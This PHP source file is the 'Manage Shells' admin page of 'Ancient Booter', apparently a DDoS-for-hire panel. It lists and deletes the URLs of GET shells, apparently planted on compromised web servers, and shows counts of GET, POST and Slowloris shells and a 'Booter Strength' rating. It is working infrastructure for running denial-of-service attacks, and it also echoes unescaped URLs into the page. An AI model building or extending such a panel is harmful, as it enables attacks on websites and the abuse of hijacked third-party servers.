<?php 
include "dbc.php";
include "includes/functions.php";
page_protect();
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Ancient Booter</title>
<!-- Calendar Styles -->
<link href="styles/fullcalendar.css" rel="stylesheet" type="text/css" />
<!-- Fancybox/Lightbox Effect -->
<link href="styles/jquery.fancybox-1.3.4.css" rel="stylesheet" type="text/css" />
<!-- WYSIWYG Editor -->
<link href="styles/wysiwyg.css" rel="stylesheet" type="text/css" />
<!-- Main Controlling Styles -->
<link href="styles/main.css" rel="stylesheet" type="text/css" />
<!-- Blue Theme Styles -->
<link href="themes/blue/styles.css" rel="stylesheet" type="text/css" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
<body>

<!-- Top header/black bar start -->
	<div id="header">
   <img src="images/logo.png" alt="AdminCP" class="logo" /></div>
 <!-- Top header/black bar end -->   
    
<!-- Left side bar start -->
        <div id="left">
<!-- Left side bar start -->

<!-- Toolbox dropdown start -->
        	<div id="openCloseIdentifier"></div>
            <div id="slider">
                <ul id="sliderContent">
                    <li><a href="hub.php" title="DDoS">DDoS Attack</a></li>
                  <li class="alt"><a href="pinger.php" title="">Pinger</a></li>
                    <li><a href="donate.php" title="">Donate</a></li>
                    <li class="alt"><a href="http://www.hackforums.net/member.php?action=profile&uid=749834" title="">Our HF Account</a></li>
                  <li><a href="logout.php" title="">Log Out</a></li>
                </ul>
                <div id="openCloseWrap">
                    <div id="toolbox">
            			<a href="#" title="Toolbox Dropdown" class="toolboxdrop">Toolbox <img src="images/icon_expand_grey.png" alt="Expand" /></a>
            		</div>
                </div>
            </div>
<!-- Toolbox dropdown end -->   
    	
<!-- Userbox/logged in start -->
            <div id="userbox">
            	<p>Welcome <?php echo $_SESSION['user_name'];?></p>
                <p><span>You are logged in as <?php 
				if($_SESSION['user_level'] == 1) {
				echo 'a Customer';
				}
				 
				if ($_SESSION['user_level'] == 5) {
				echo 'an Administrator';	
				}
				?> </span></p>
                <ul>
                	<li><a href="mailto:ancient-productions@hotmail.com" title="Contact Us"><img src="images/icons/icon_mail.png" alt="Contact Us" /></a></li>
                    <?php 
				if($_SESSION['user_level'] == 1) {
				
				}
				 
				if ($_SESSION['user_level'] == 5) {
					?><li><a href="admin.php" title="Admin CP"><img src="images/icons/icon_cog.png" alt="Configure" /></a></li><?php
				}
				?>
                    <li><a href="logout.php" title="Logout"><img src="images/icons/icon_unlock.png" alt="Logout" /></a></li>
                </ul>
            </div>
<!-- Userbox/logged in end -->  

<!-- Main navigation start -->         
            <ul id="nav">
            	
          <li>
                    <ul class="navigation">
                        <li class="heading selected">Main Controls</li>
                        <li><a href="hub.php" title="">DDoS Attack</a></li>
                        <li><a href="index.php" title="">Home</a></li>
                        <li><a href="mysettings.php" title="">My Account</a></li>
                    </ul>
                </li>
                <li>
                    <a class="collapsed heading">Misc. Controls</a>
                     <ul class="navigation">
                        <li><a href="terms.php" title="">Terms of Use</a></li>
                        <li><a href="mailto:ancient-productions@hotmail.com" title="">Contact Us</a></li>
                        <li><a href="donate.php" title="">Donate</a></li>
                    </ul>
                </li>        
            </ul>
        </div>      
<!-- Main navigation end --> 

<!-- Left side bar start end -->   

<!-- Right side start -->     
        <div id="right">

<!-- Breadcrumb start -->  
          <div id="breadcrumb">
                <ul>	
        			<li><img src="images/icon_breadcrumb.png" alt="Location" /></li>
                    <li><a href="editshells.php" title="">Manage Shells</a></li>
                    <li>/</li>
                    <li class="current">GET</li>
                </ul>
            </div>
<!-- Breadcrumb end -->  

<!-- Top/large buttons start -->  
            <ul id="topbtns">
            	<li class="desc"><strong>Quick Links</strong><br />Popular shortcuts</li>
                <li></li>
                <li>
                
                <a href="hub.php"><img src="images/icons/attack.png" alt="DDoS" /><br />DDoS Attack</a>
                
                </li>
                <li>
                	<a href="mysettings.php"><img src="images/icons/icon_lrg_user.png" alt="Users" /><br />
                	My Account</a>
                </li>
               
                <li>
                	<a href="chat.php"><img src="images/icons/icon_lrg_comment.png" alt="Comment" /><br />
                	Chat</a>
                </li>
                <li>
                	<a href="support.php"><img src="images/icons/icon_lrg_support.png" alt="Support" /><br />Support</a>
                </li>
                <?php if ($_SESSION['user_level'] == 1){
				}
				else if ($_SESSION['user_level'] == 5) {
					?>
                <li>
                <a href="admin.php"><img src="images/icons/icon_lrg_create.png" alt="Admin CP" /><br />Admin CP</a>
                </li>
				<?php } ?>
            </ul>
<!-- Top/large buttons end -->  

 <!-- Main content start -->      
            <div id="content">

<!-- Charts box start -->          
        		<div class="container med left" id="graphs">
                	<div class="conthead">
                		<h2>Manage Shells</h2>
                    </div>
<!-- Tabbed navigation start -->                    
               	  <div class="contentbox">
                    <p><?php
					if(!checkAdmin()) {
die("<div class=\"box\">
    <h2>Administration Panel &bull; Access Denied</h2>
<div class=\"box-content\">
<p>You are not an administrator.</p>
</div></div>");
exit();
}

$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
mysql_select_db(DB_NAME, $link);

$query="SELECT * FROM getshells";
$result = mysql_query($query) or die(mysql_error());
$num = mysql_numrows($result);

if(!checkAdmin()) {
header("Location: login.php");
exit();
}

$link = mysql_connect("localhost", DB_USER, DB_PASS);
mysql_select_db(DB_NAME, $link);

$query="SELECT * FROM getshells";
$result=mysql_query($query) or die(mysql_error());

	if(isset($_GET['delid'])){
		$f1 = mysql_real_escape_string($_GET['delid']);

		if(mysql_query("DELETE FROM getshells WHERE url LIKE '$f1'")){
			echo '<meta http-equiv="refresh" content="0; URL=editgetshells.php">';
		}else {
		die(mysql_error());
		}
	}

?>


<div class="content">
<h3>Manage Shells</h3>
<table border="1" bordercolor="#FFFFF" style="background-color:#262626" width="90%" cellpadding="1" cellspacing="1">
	<tr>
<td width="10%"><center>ID</center></td><td width="20%"><center>Link</center></td><td><center><font color="white">Shell URL</font></center></td><td width="20%"><center>
Delete
</center></td>
</tr><tr>
<?php
$i = 0;
while ($i < $num) {

$id++;
$f1 = mysql_result($result,$i,"URL");

?>

<?php echo "<tr><td width=\"10%\"><center>{$id}</center></td><td width=\"20%\"><a target=_new href=\"{$f1}\"><center><image alt=\"{$f1}\" border=0 src=\"images/visit.png\"></a></center></td><td width=\"80%\"><center>$f1</td><td><a href=\"editgetshells.php?delid={$f1}\"><center><image border=0 src=\"images/cancel.png\"></a></td></center><tr/>"; ?>

<?php
$i++;
}

?>
</tr>
















	
</table>
<br>
</DIV>

					
					
					
					
					 </p>
               	  </div> 
                </div>
                
<!-- Website stats start -->               
                <div class="container sml right">
                	<div class="conthead">
                		<h2>Shell Stats</h2>
                    </div>
                	<div class="contentbox">
                    	<ul class="summarystats">
                       	  <li>
                            	<p class="statcount"><?php echo $shellsOnline; ?></p> 
                            	<p>Total Shells</p>
                       	  </li>
                          <li>
                            	<p class="statcount"><?php echo $num_rows; ?></p> <p>GET Shells</p>
                          </li>
                             <li>
                            	<p class="statcount"><?php echo $num_rows2; ?></p> <p>POST Shells</p>
                            </li>
                          <li>
                            	<p class="statcount"><?php echo $num_rows3; ?></p> <p>Slowloris Shells</p>
                          </li>
                          <li>
                            	<p class="statcount"><?php
            if($shellRotation == 0){
				?> <font color="red"> <?php echo '(Off)';
			}
			else{
				
		?> <font color="lime"> <?php	echo '(On)';
			}
			?></font> <?php
			 
            ?></p> <p>Shell Rotation</p>
                          </li>
                        </ul>
                        
                        <p><strong>Booter Strength</strong></p>
                        
                        <table>
                            <tr>
                            <?php if ($shellsOnline >= 1000) { ?>
                            
                                <td width="150"><strong><span class="usagetxt redtxt">Strong</span></strong></td>
                                <td width="500">
                                    <div class="usagebox">
                                        1000+ Shells
                                    </div>
                                </td>
                            
                            <?php
							}
							?>
                            </tr>
                            <tr>
                            <?php if ($shellsOnline < 1000 && $shellsOnline > 500){ ?>
                            
                       
                                <td><strong><span class="usagetxt orangetxt">Medium</span></strong></td>
                                <td>
                                    <div class="usagebox">
                                       501-999 Shells
                                    </div>
                                </td>
                            
                            <?php 
							}
							 ?>
                          </tr>
                             <tr>
                             <?php if ($shellsOnline <= 500) { ?>
                            
                                <td><strong><span class="usagetxt greentxt">Weak</span></strong></td>
                                <td>
                                    <div class="usagebox">
                                       0-500 Shells
                                    </div>
                                </td>
                            
                            <?php } ?>
                            </tr>
                        </table>
                    </div>
                </div>
<!-- Website stats end -->  
               
                <!-- Clear finsih for all floated content boxes --> <div style="clear: both"></div>
                
<!-- Form elements start --><!-- Form elements end -->  
 
<!-- Gallery start --><!-- Gallery end -->
 
<!-- Generic style tabbing start --><!-- Generic style tabbing start -->  
                
                <!-- Clear finsih for all floated content boxes --><div style="clear: both"></div>
                
<!-- Calendar start -->             
                
          </div>
<!-- Calendar end -->
    
<!-- Table styles start -->           
                
<!-- Table styles end -->  
                
                <!-- Status Bar Start --><!-- Status Bar End -->
                
                 <!-- Red Status Bar Start --><!-- Red Status Bar End -->
                
                <!-- Green Status Bar Start --><!-- Green Status Bar End -->
                
                <!-- Blue Status Bar Start --><!-- Blue Status Bar End -->   
        	</div>
            
<!-- Footer start --> 
          <p id="footer">&copy; Ancient Productions™  </p>
<!-- Footer end -->      
     
        </div>
<!-- Right side end --> 

<script type="text/javascript" src="http://dwpe.googlecode.com/svn/trunk/_shared/EnhanceJS/enhance.js"></script>	
   		<script type='text/javascript' src='http://dwpe.googlecode.com/svn/trunk/charting/js/excanvas.js'></script>
        <script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js'></script>
        <script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.6/jquery-ui.min.js'></script>
        <script type='text/javascript' src='js/jquery.fancybox-1.3.4.pack.js'></script>
        <script type='application/javascript' src='js/fullcalendar.min.js'></script>
        <script type='text/javascript' src='js/jquery.wysiwyg.js'></script>
        <script type='text/javascript' src='js/visualize.jQuery.js'></script>
        <script type='application/javascript' src='js/functions.js'></script>
</body>
</html>
